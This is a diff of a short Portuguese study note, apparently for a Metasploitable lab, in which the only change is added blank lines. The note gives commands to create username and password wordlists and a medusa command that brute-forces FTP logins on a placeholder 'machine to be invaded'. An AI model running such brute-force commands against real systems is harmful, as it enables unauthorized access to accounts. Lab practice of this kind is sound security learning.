@@ -13,10 +13,13 @@ COMANDO PARA CRIAR UMA LISTA DE USUÁRIOS:
 
 echo -e 'users\nmsfadmin\nadmin\nroot' > users.txt
 
+
 COMANDO PARA CRIAR UMA LISTA DE SENHAS:
 
 echo -e '123456\nmsfadmin\nadmin\nroot' > pass.txt
 
+
 COMANDO PARA USAR PARA TESTAR DIFERENTES USUARIOS E SENHAS:
 
 medusa -h IP_DA_MAQUINA_A_SER_INVADIDA -U users.txt -P pass.txt -M ftp -t 6
+
